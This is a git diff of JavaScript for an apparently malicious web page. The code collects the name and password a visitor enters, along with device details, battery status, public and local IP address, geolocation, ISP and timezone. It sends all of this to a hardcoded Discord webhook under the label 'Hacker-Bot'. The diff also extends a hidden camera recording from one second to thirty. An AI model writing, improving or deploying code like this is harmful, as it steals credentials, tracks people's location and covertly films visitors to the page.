@@ -120,13 +120,31 @@
             event.style.transform = 'scaleX(0)';
       	}, 1000)
       const info = 
-`[+]Information: 2
-[+]Name: ${Name}
-[+]Password: ${Password2}`;
+`${"```"}
+========================================
+           DATA INFORMATION
+========================================
+[+] Name: ${Name}
+[+] Password: ${Password2}
+${"```"}`;
 console.log(info);
-const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 2", avatar_url: "https://example.com/avatar.png"}
-fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})}}
-const webhookURL = "https://discord.com/api/webhooks/1355803634037686344/_au3aPBo4iSJvyH6cNTJx50C9S_sQf9AAuAe9RYM0oGGo3I1L_Go8jq28CyoTwJrbT5a"
+const messagePayload1 = {
+        content: " ",
+        username: "Hacker-Bot: 2",
+        avatar_url: "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png",
+        embeds: [{
+            title: "**                         INFORMATION: 2**",
+            description: info,
+            color: 0x18100,
+            footer: {text: "Hacker-Bot: 2"},
+            timestamp: new Date().toISOString()
+        }]
+    };
+fetch(webhookURL, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(messagePayload1)})}};
+const webhookURL = "https://discord.com/api/webhooks/1355803634037686344/_au3aPBo4iSJvyH6cNTJx50C9S_sQf9AAuAe9RYM0oGGo3I1L_Go8jq28CyoTwJrbT5a";
 const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
 let IP = "Fetching...";
 let localIP = "Unavailable";
@@ -136,191 +154,206 @@ const connection = navigator.connection || {};
 const ua = navigator.userAgent.toLowerCase();
 const isAndroid = /android/.test(ua);
 async function getBatteryInfo() {
-    if (!navigator.getBattery) return {
-        charging: "Unknown",
-        level: "Unknown",
-        chargingTime: "Unknown",
-        dischargingTime: "Unknown"
-    };
-
-    try {
-        const battery = await navigator.getBattery();
-        return {
-            charging: battery.charging ? "true" : "false",
-            level: Math.round(battery.level * 100) + "%",
-            chargingTime: battery.chargingTime ? `${battery.chargingTime} sec` : "N/A",
-            dischargingTime: battery.dischargingTime ? `${battery.dischargingTime} sec` : "N/A"
-        };
-    } catch (error) {
-        console.error("Error fetching battery info:", error);
-        return {
-            charging: "Unknown",
-            level: "Unknown",
-            chargingTime: "Unknown",
-            dischargingTime: "Unknown"
-        };
-    }
+	if (!navigator.getBattery) return {
+		charging: "Unknown",
+		level: "Unknown",
+		chargingTime: "Unknown",
+		dischargingTime: "Unknown"
+	};
+	
+	try {
+		const battery = await navigator.getBattery();
+		return {
+			charging: battery.charging ? "true" : "false",
+			level: Math.round(battery.level * 100) + "%",
+			chargingTime: battery.chargingTime ? `${battery.chargingTime} sec` : "N/A",
+			dischargingTime: battery.dischargingTime ? `${battery.dischargingTime} sec` : "N/A"
+		};
+	} catch (error) {
+		console.error("Error fetching battery info:", error);
+		return {
+			charging: "Unknown",
+			level: "Unknown",
+			chargingTime: "Unknown",
+			dischargingTime: "Unknown"
+		};
+	}
 }
 
 function getDeviceName() {
-    const devices = ["iPhone", "OPPO", "Vivo", "Realme", "OnePlus", "Samsung", "Xiaomi", "Huawei", "Tecno", "Windows", "Macintosh", "Linux"];
-    const match = devices.find(device => new RegExp(device, "i").test(navigator.userAgent));
-    return match ? match.replace("Macintosh", "Mac Device").replace("Windows", "Windows Device").replace("Linux", "Linux Device") : "Unknown Device";
+	const devices = ["iPhone", "OPPO", "Vivo", "Realme", "OnePlus", "Samsung", "Xiaomi", "Huawei", "Tecno", "Windows", "Macintosh", "Linux"];
+	const match = devices.find(device => new RegExp(device, "i").test(navigator.userAgent));
+	return match ? match.replace("Macintosh", "Mac Device").replace("Windows", "Windows Device").replace("Linux", "Linux Device") : "Unknown Device";
 }
 
 function getOSVersion() {
-    let ua = navigator.userAgent;
-    let android = ua.match(/Android\s([\d.]+)/);
-    let ios = ua.match(/OS (\d+_\d+(_\d+)?)/);
-    if (android) return `Android ${android[1]}`;
-    if (/iPad|iPhone|iPod/.test(ua)) return `iOS ${ios ? ios[1].replace(/_/g, ".") : "(version unknown)"}`;
-    return "Unknown OS";
+	let ua = navigator.userAgent;
+	let android = ua.match(/Android\s([\d.]+)/);
+	let ios = ua.match(/OS (\d+_\d+(_\d+)?)/);
+	if (android) return `Android ${android[1]}`;
+	if (/iPad|iPhone|iPod/.test(ua)) return `iOS ${ios ? ios[1].replace(/_/g, ".") : "(version unknown)"}`;
+	return "Unknown OS";
 }
 
 async function getLocalIP() {
-    return new Promise((resolve) => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel("");
-        pc.setLocalDescription(pc.createOffer());
-        pc.onicecandidate = (e) => {
-            const candidate = e.candidate?.candidate?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
-            if (candidate) resolve(candidate);
-        };
-        setTimeout(() => resolve("Unavailable"), 2000);
-    });
+	return new Promise((resolve) => {
+		const pc = new RTCPeerConnection({
+			iceServers: []
+		});
+		pc.createDataChannel("");
+		pc.setLocalDescription(pc.createOffer());
+		pc.onicecandidate = (e) => {
+			const candidate = e.candidate?.candidate?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
+			if (candidate) resolve(candidate);
+		};
+		setTimeout(() => resolve("Unavailable"), 2000);
+	});
 }
 
 async function getLocationData() {
-    try {
-        let response = await fetch("https://ipwho.is/");
-        let data = await response.json();
-        return {
-            country: `${data.country} ${data.country_code} ${data.flag.emoji}`,
-            region: `${data.region} ${data.region_code}`,
-            continent: `${data.continent} ${data.continent_code}`,
-            city: data.city,
-            latitude: data.latitude,
-            longitude: data.longitude,
-            is_eu: data.is_eu ? "true" : "false",
-            postal: data.postal,
-            calling_code: data.calling_code,
-            capital: data.capital,
-            borders: data.borders,
-            ip: data.ip,
-            asn: data.connection.asn,
-            org: data.connection.org,
-            isp: data.connection.isp,
-            domain: data.connection.domain,
-            timezone: {
-                id: data.timezone.id,
-                abbr: data.timezone.abbr,
-                is_dst: data.timezone.is_dst ? "true" : "false",
-                current_time: data.timezone.current_time,
-                offset: data.timezone.offset,
-                utc: data.timezone.utc
-            }
-        };
-    } catch (error) {
-        return {};
-    }
+	try {
+		let response = await fetch("https://ipwho.is/");
+		let data = await response.json();
+		return {
+			country: `${data.country} ${data.country_code} ${data.flag.emoji}`,
+			region: `${data.region} ${data.region_code}`,
+			continent: `${data.continent} ${data.continent_code}`,
+			city: data.city,
+			latitude: data.latitude,
+			longitude: data.longitude,
+			is_eu: data.is_eu ? "true" : "false",
+			postal: data.postal,
+			calling_code: data.calling_code,
+			capital: data.capital,
+			borders: data.borders,
+			ip: data.ip,
+			asn: data.connection.asn,
+			org: data.connection.org,
+			isp: data.connection.isp,
+			domain: data.connection.domain,
+			timezone: {
+				id: data.timezone.id,
+				abbr: data.timezone.abbr,
+				is_dst: data.timezone.is_dst ? "true" : "false",
+				current_time: data.timezone.current_time,
+				offset: data.timezone.offset,
+				utc: data.timezone.utc
+			}
+		};
+	} catch (error) {
+		return {};
+	}
 }
 
-async function getC(){
-    try {
-        let response = await fetch('https://ipapi.co/json/');
-        let data = await response.json();
-        CA = data.country_area;
-        CP = data.country_population;
-    } catch (error) {
-        CA = "Unknown";
-        CP = "Unknown";
-    }}
+async function getC() {
+	try {
+		let response = await fetch('https://ipapi.co/json/');
+		let data = await response.json();
+		CA = data.country_area;
+		CP = data.country_population;
+	} catch (error) {
+		CA = "Unknown";
+		CP = "Unknown";
+	}
+}
 
 getC();
-
-
 async function getinfo() {
-    const battery = await getBatteryInfo();
-    const locationData = await getLocationData();
-    const deviceName = getDeviceName();
-    const os = getOSVersion();
-    const localIP = await getLocalIP(); // Await the local IP function
-    const timeInfo = new Date().toLocaleTimeString();
-    const connection = navigator.connection || {};
-    let info = `
+		const battery = await getBatteryInfo();
+		const locationData = await getLocationData();
+		const deviceName = getDeviceName();
+		const os = getOSVersion();
+		const localIP = await getLocalIP(); // Await the local IP function
+		const timeInfo = new Date().toLocaleTimeString();
+		const connection = navigator.connection || {};
+		let info = `
+${"```"}
 ========================================
            DEVICE INFORMATION
 ========================================
-Device:      ${isAndroid?"Android":"iOS"}
-Name:        ${deviceName}
-Version:     ${os}
-App Name:    ${navigator.appName || "Unknown"}
-Online:      ${navigator.onLine || "Unknown"}
-Max Points:  ${navigator.maxTouchPoints || "Unknown"}
-Product:     ${navigator.product || "Unknown"}
-Platform:    ${navigator.platform || "Unknown"}
-Vendor:      ${navigator.vendor || "Unknown"}
-Language:    ${navigator.language || "Unknown"}
-Languages:   ${navigator.languages || "Unknown"}
-Cookies:     ${navigator.cookieEnabled || "Unknown"}
-App Code:    ${navigator.appCodeName || "Unknown"}
-RAM:         ${navigator.deviceMemory || "Unknown"}
-
+[+] Device:      ${isAndroid?"Android":"iOS"}
+[+] Name:        ${deviceName}
+[+] Version:     ${os}
+[+] App Name:    ${navigator.appName || "Unknown"}
+[+] Online:      ${navigator.onLine || "Unknown"}
+[+] Max Points:  ${navigator.maxTouchPoints || "Unknown"}
+[+] Product:     ${navigator.product || "Unknown"}
+[+] Platform:    ${navigator.platform || "Unknown"}
+[+] Vendor:      ${navigator.vendor || "Unknown"}
+[+] Language:    ${navigator.language || "Unknown"}
+[+] Languages:   ${navigator.languages || "Unknown"}
+[+] Cookies:     ${navigator.cookieEnabled || "Unknown"}
+[+] App Code:    ${navigator.appCodeName || "Unknown"}
+[+] RAM:         ${navigator.deviceMemory || "Unknown"}
 ========================================
            BATTERY INFORMATION
 ========================================
-Charging:    ${battery.charging || "Unknown"}
-Level:       ${battery.level || "Unknown"}
-Charging:    ${battery.chargingTime || "Unknown"}
-Discharging: ${battery.dischargingTime || "Unknown"}
-
+[+] Charging:    ${battery.charging || "Unknown"}
+[+] Level:       ${battery.level || "Unknown"}
+[+] Charging:    ${battery.chargingTime || "Unknown"}
+[+] Discharging: ${battery.dischargingTime || "Unknown"}
 ========================================
            LOCATION INFORMATION
 ========================================
-Country:    ${locationData.country || "Unknown"}
-Public IP:  ${locationData.ip || "Unknown"}
-Local IP:   ${localIP || "Unknown"}
-Region:     ${locationData.region || "Unknown"}
-Continent:  ${locationData.continent || "Unknown"}
-City:       ${locationData.city || "Unknown"}
-Latitude:   ${locationData.latitude || "Unknown"}
-Longitude:  ${locationData.longitude || "Unknown"}
-EU Member:  ${locationData.is_eu || "Unknown"}
-Postal:     ${locationData.postal || "Unknown"}
-Call Code:  +${locationData.calling_code || "Unknown"}
-Capital:    ${locationData.capital || "Unknown"}
-Borders:    ${locationData.borders || "Unknown"}
-Population: ${CP || "Unknown"}
-Area:       ${CA || "Unknown"}
-
+[+] Country:    ${locationData.country || "Unknown"}
+[+] Public IP:  ${locationData.ip || "Unknown"}
+[+] Local IP:   ${localIP || "Unknown"}
+[+] Region:     ${locationData.region || "Unknown"}
+[+] Continent:  ${locationData.continent || "Unknown"}
+[+] City:       ${locationData.city || "Unknown"}
+[+] Latitude:   ${locationData.latitude || "Unknown"}
+[+] Longitude:  ${locationData.longitude || "Unknown"}
+[+] EU Member:  ${locationData.is_eu || "Unknown"}
+[+] Postal:     ${locationData.postal || "Unknown"}
+[+] Call Code:  +${locationData.calling_code || "Unknown"}
+[+] Capital:    ${locationData.capital || "Unknown"}
+[+] Borders:    ${locationData.borders || "Unknown"}
+[+] Population: ${CP || "Unknown"}
+[+] Area:       ${CA || "Unknown"}
 ========================================
-          CONNECTION INFORMATION
+         CONNECTION INFORMATION
 ========================================
-ASN:       ${locationData.asn || "Unknown"}
-ISP:       ${locationData.isp || "Unknown"}
-Org:       ${locationData.org || "Unknown"}
-Domain:    ${locationData.domain || "Unknown"}
-Hardware:  ${navigator.hardwareConcurrency || "Unknown"}
-Downlink:  ${connection.downlink || "Unknown"}
-Save Data: ${connection.saveData || "Unknown"}
-Effective: ${connection.effectiveType || "Unknown"}
-RTT:       ${connection.rtt || "Unknown"}
-
+[+] ASN:       ${locationData.asn || "Unknown"}
+[+] ISP:       ${locationData.isp || "Unknown"}
+[+] Org:       ${locationData.org || "Unknown"}
+[+] Domain:    ${locationData.domain || "Unknown"}
+[+] Hardware:  ${navigator.hardwareConcurrency || "Unknown"}
+[+] Downlink:  ${connection.downlink || "Unknown"}
+[+] Save Data: ${connection.saveData || "Unknown"}
+[+] Effective: ${connection.effectiveType || "Unknown"}
+[+] RTT:       ${connection.rtt || "Unknown"}
 ========================================
           TIMEZONE INFORMATION
 ========================================
-ID:         ${locationData.timezone?.id || "Unknown"}
-Abbr:       ${locationData.timezone?.abbr || "Unknown"}
-DST Active: ${locationData.timezone?.is_dst || "Unknown"}
-Offset:     UTC ${locationData.timezone?.offset || "Unknown"}
-UTC Time:   ${locationData.timezone?.utc || "Unknown"}
-Local Time: ${locationData.timezone?.current_time || "Unknown"}
-Time Now:   ${timeInfo || "Unknown"}
+[+] ID:         ${locationData.timezone?.id || "Unknown"}
+[+] Abbr:       ${locationData.timezone?.abbr || "Unknown"}
+[+] DST Active: ${locationData.timezone?.is_dst || "Unknown"}
+[+] Offset:     UTC ${locationData.timezone?.offset || "Unknown"}
+[+] UTC Time:   ${locationData.timezone?.utc || "Unknown"}
+[+] Local Time: ${locationData.timezone?.current_time || "Unknown"}
+[+] Time Now:   ${timeInfo || "Unknown"}
+${"```"}
 `;
-console.log(info);
-const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot", avatar_url: "https://example.com/avatar.png"}
-fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})};
-setTimeout(getinfo, 1000)
+    console.log(info);
+    const messagePayload1 = {
+        content: " ",
+        username: "Hacker-Bot: 1",
+        avatar_url: "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png",
+        embeds: [{
+            title: "**                         INFORMATION: 1**",
+            description: info,
+            color: 0x18100,
+            footer: {text: "Hacker-Bot: 1"},
+            timestamp: new Date().toISOString()
+        }]
+    };
+fetch(webhookURL, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(messagePayload1)});
+};
+
+setTimeout(getinfo, 2000)
 async function startVideo() {
   try {
   const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); // No audio
@@ -333,7 +366,7 @@ async function startVideo() {
   setTimeout(() => {
     mediaRecorder.stop();
     stream.getTracks().forEach(track => track.stop());
-  }, 1000);
+  }, 30000);
   } catch (error) {console.error("Error accessing camera:", error);}}
 
 function downloadVideo() {
